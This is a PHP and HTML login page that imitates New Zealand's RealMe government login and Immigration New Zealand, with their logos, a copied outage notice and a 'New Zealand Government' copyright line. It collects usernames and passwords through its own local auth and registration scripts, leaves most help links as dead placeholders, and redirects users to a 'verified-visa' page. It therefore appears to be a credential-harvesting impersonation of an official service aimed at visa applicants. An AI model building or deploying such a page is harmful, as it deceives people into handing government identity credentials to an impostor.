<?php
require_once __DIR__ . '/nz-auth.php';
nz_auth_start_session();

$base = nz_base_path();
$homePath      = $base . '/index.php';
$loginPath     = $base . '/login.php';
$registerPath  = $base . '/register.php';
$dashboardPath = $base . '/verified-visa.php';

if (nz_auth_is_logged_in()) {
    header('Location: ' . $dashboardPath);
    exit;
}

$errorMessage = '';
$email = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = trim((string) ($_POST['email'] ?? ''));
    $password = (string) ($_POST['password'] ?? '');

    $result = nz_auth_login($email, $password);

    if ($result['ok'] === true) {
        header('Location: ' . $dashboardPath);
        exit;
    }
    $errorMessage = (string) $result['message'];
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in with RealMe – New Zealand Immigration</title>
    <style>
        :root {
            --orange: #c0390c;
            --orange-dark: #a83009;
            --orange-hover: #e04010;
            --black: #000000;
            --gray-bg: #f0f0f0;
            --border: #ccc;
            --text: #333;
            --text-light: #555;
            --white: #fff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            color: var(--text);
            background: var(--white);
            min-height: 100vh;
            display: flex;
            flex-direction: column
        }

        /* ── TOP HEADER ── */
        .rm-header {
            background: var(--black);
            padding: 0 32px;
            min-height: 72px;
            display: flex;
            align-items: center;
            justify-content: space-between
        }

        .rm-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none
        }

        .rm-logo-icon {
            width: 46px;
            height: 46px;
            background: var(--orange);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0
        }

        .rm-logo-icon svg {
            width: 26px;
            height: 26px
        }

        .rm-logo-text {
            color: var(--white);
            line-height: 1.2
        }

        .rm-logo-text .brand {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -.3px
        }

        .rm-logo-text .brand span {
            color: var(--orange)
        }

        .rm-logo-text .reg {
            font-size: 10px;
            vertical-align: super
        }

        .rm-logo-text .maori {
            font-size: 13px;
            color: rgba(255, 255, 255, .7);
            font-style: italic
        }

        .nz-imm-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none
        }

        .nz-imm-logo-text {
            color: var(--white);
            font-size: 13px;
            font-weight: 700;
            letter-spacing: .06em;
            text-transform: uppercase;
            text-align: right;
            line-height: 1.3
        }

        /* ── NOTICE BAR ── */
        .notice-top {

            background: var(--gray-bg);
        }

        .notice-bar {
            max-width: 800px;
            border-bottom: 1px solid #ddd;
            padding: 14px 32px
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: var(--text);
            text-decoration: none;
            margin-bottom: 16px
        }

        .back-link:hover {
            text-decoration: underline
        }

        .notice-bar p {
            font-size: 16px;
            line-height: 1.6;
            color: var(--text);
            margin-bottom: 10px
        }

        .notice-bar p:last-child {
            margin-bottom: 0
        }

        .notice-bar p strong {
            color: var(--black)
        }

        /* ── MAIN CONTENT ── */
        .rm-main {
            flex: 1;
            display: flex;
            /* max-width: 920px; */
            margin: 0 auto;
            width: 100%;
            padding: 48px 32px
        }

        .rm-left {
            flex: 0 0 420px;
            padding-right: 48px;
            border-right: 1px solid #e0e0e0
        }

        .rm-right {
            flex: 1;
            padding-left: 48px
        }

        .rm-heading {
            font-size: 42px;
            font-weight: 400;
            color: var(--orange);
            margin-bottom: 12px;
            line-height: 1.2
        }

        .rm-heading strong {
            font-weight: 700
        }

        .rm-subtext {
            font-size: 15px;
            color: var(--text);
            margin-bottom: 24px;
            line-height: 1.6
        }

        .rm-subtext a {
            color: var(--orange);
            text-decoration: underline
        }

        /* ── FORM FIELDS ── */
        .rm-field {
            margin-bottom: 16px
        }

        .rm-field input {
            width: 100%;
            padding: 13px 14px;
            border: 1px solid var(--border);
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            color: var(--text);
            background: var(--white);
            transition: border-color .2s, box-shadow .2s
        }

        .rm-field input::placeholder {
            color: #999
        }

        .rm-field input:focus {
            border-color: var(--orange);
            box-shadow: 0 0 0 3px rgba(192, 57, 12, .15)
        }

        .error-box {
            margin-bottom: 16px;
            padding: 12px 14px;
            background: #fdecea;
            border: 1px solid #f4c7c3;
            border-radius: 5px;
            color: #b42318;
            font-size: 14px
        }

        /* ── BUTTONS ── */
        .btn-login {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 14px 28px;
            background: var(--orange);
            color: var(--white);
            border: none;
            border-radius: 28px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background .2s;
            text-decoration: none;
            margin-top: 6px
        }

        .btn-login:hover {
            background: var(--orange-dark)
        }

        .btn-login-icon {
            width: 28px;
            height: 28px;
            background: rgba(255, 255, 255, .25);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0
        }

        .forgot-links {
            margin-top: 16px;
            font-size: 14px
        }

        .forgot-links a {
            color: var(--orange);
            text-decoration: underline
        }

        .forgot-links a:hover {
            color: var(--orange-dark)
        }

        /* ── RIGHT COLUMN ── */
        .create-desc {
            font-size: 15px;
            color: var(--text);
            line-height: 1.6;
            margin-bottom: 18px
        }

        .create-desc a {
            color: var(--orange);
            text-decoration: underline
        }

        /* ── FOOTER ── */
        .rm-footer {
            background: var(--orange);
            padding: 24px 32px 20px
        }

        .rm-footer-links {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(255, 255, 255, .35)
        }

        .rm-footer-links-left {
            display: flex;
            gap: 24px;
            flex-wrap: wrap
        }

        .rm-footer-links-left a,
        .rm-footer-lang a {
            color: var(--white);
            font-size: 14px;
            text-decoration: none
        }

        .rm-footer-links-left a:hover,
        .rm-footer-lang a:hover {
            text-decoration: underline
        }

        .rm-footer-lang {
            display: flex;
            gap: 8px;
            align-items: center
        }

        .rm-footer-lang .active {
            font-weight: 700
        }

        .rm-footer-copy {
            margin-top: 14px;
            font-size: 13px;
            color: rgba(255, 255, 255, .85)
        }

        @media(max-width:700px) {
            .rm-main {
                flex-direction: column;
                padding: 28px 20px
            }

            .rm-left {
                padding-right: 0;
                border-right: none;
                border-bottom: 1px solid #e0e0e0;
                padding-bottom: 32px;
                margin-bottom: 32px;
                flex: none
            }

            .rm-right {
                padding-left: 0
            }

            .rm-header {
                padding: 0 16px
            }

            .notice-bar {
                padding: 14px 16px
            }
        }
    </style>
</head>

<body>

    <!-- HEADER -->
    <header class="rm-header">
        <a href="<?php echo htmlspecialchars($homePath, ENT_QUOTES, 'UTF-8'); ?>" class="rm-logo">
            <img style="height: 120px;" src="image/realme-logo.png" alt="">
        </a>
        <a href="<?php echo htmlspecialchars($homePath, ENT_QUOTES, 'UTF-8'); ?>" class="nz-imm-logo">
            <img src="image/nz-logo.png" alt="">
           
        </a>
    </header>

    <!-- NOTICE BAR -->
    <div class="notice-top">
        <div class="notice-bar">
            <a style="font-size: 18px; margin-bottom: 60px;" href="<?php echo htmlspecialchars($homePath, ENT_QUOTES, 'UTF-8'); ?>" class="back-link">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10" />
                    <polyline points="12 8 8 12 12 16" />
                    <line x1="16" y1="12" x2="8" y2="12" />
                </svg>
                <strong> Go back to Immigration New Zealand</strong>
            </a>
            <p><strong>Outage to RealMe verified identity portal &ndash; 9pm, Friday 20 March to 11pm, Sunday 22 March</strong> We're upgrading our RealMe verified identity service. You will be unable to apply for a verified identity, or manage an existing verified identity, from 9pm, Friday 20 March to 11pm, Sunday 22 March while we complete the upgrade. The RealMe login service is not impacted and can be used as usual.</p>
            <p><strong>Complete your verified identity application by 5pm, Friday 20 March</strong> If you apply for a verified identity and are required to take your photo online or visit a RealMe partner store, you must do this by 5pm on Friday 20 March. If you do not complete it by 5pm, your application will be cancelled. You will be able to apply again from Monday 23 March after our system upgrade is complete.</p>

        </div>
    </div>


    <!-- MAIN -->
    <div class="rm-main">
        <!-- LEFT: Login -->
        <div class="rm-left">
            <h1 class="rm-heading">Log in with <strong>RealMe</strong></h1>
            <p class="rm-subtext">You've been redirected here so you can log in with RealMe</p>

            <?php if ($errorMessage !== ''): ?>
                <div class="error-box"><?php echo htmlspecialchars($errorMessage, ENT_QUOTES, 'UTF-8'); ?></div>
            <?php endif; ?>

            <form method="POST" action="<?php echo htmlspecialchars($loginPath, ENT_QUOTES, 'UTF-8'); ?>">
                <div class="rm-field">
                    <input type="text" id="email" name="email" required autocomplete="username"
                        placeholder="Username or Email"
                        value="<?php echo htmlspecialchars($email, ENT_QUOTES, 'UTF-8'); ?>">
                </div>
                <div class="rm-field">
                    <input type="password" id="password" name="password" required autocomplete="current-password"
                        placeholder="Password">
                </div>
                <button type="submit" class="btn-login">
                    <span class="btn-login-icon">
                        <svg width="16" height="16" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M13 4C8.03 4 4 8.03 4 13s4.03 9 9 9 9-4.03 9-9-4.03-9-9-9zm0 2c1.5 0 2.9.43 4.08 1.17L6.17 17.08A6.96 6.96 0 0 1 6 13c0-3.86 3.14-7 7-7zm0 14c-1.5 0-2.9-.43-4.08-1.17l10.91-10.91A6.96 6.96 0 0 1 20 13c0 3.86-3.14 7-7 7z" fill="white" />
                        </svg>
                    </span>
                    Log in
                </button>
            </form>

            <div class="forgot-links">
                <a href="#">Forgot Username</a> or <a href="#">Forgot Password?</a>
            </div>
        </div>

        <!-- RIGHT: Create account -->
        <div class="rm-right">
            <h2 class="rm-heading">Create a <strong>RealMe</strong> login</h2>
            <p class="create-desc">To access this service you need a <a href="#">RealMe login.</a></p>
            <p class="create-desc">You'll be able to access a range of services with a single username and password. RealMe is designed to protect your privacy and security.</p>
            <a href="<?php echo htmlspecialchars($registerPath, ENT_QUOTES, 'UTF-8'); ?>" class="btn-login">
                <span class="btn-login-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10" />
                        <polyline points="12 16 16 12 12 8" />
                        <line x1="8" y1="12" x2="16" y2="12" />
                    </svg>
                </span>
                Create a RealMe login
            </a>
        </div>
    </div>

    <!-- FOOTER -->
    <footer class="rm-footer">
        <div class="rm-footer-links">
            <div class="rm-footer-links-left">
                <a href="#">Help &amp; contact us</a>
                <a href="#">Terms of use</a>
                <a href="#">Privacy</a>
                <a href="#">About this site</a>
            </div>
            <div class="rm-footer-lang">
                <a href="#" class="active">English</a>
                <a href="#">中文</a>
            </div>
        </div>
        <div class="rm-footer-copy">&copy; New Zealand Government.</div>
    </footer>

</body>

</html>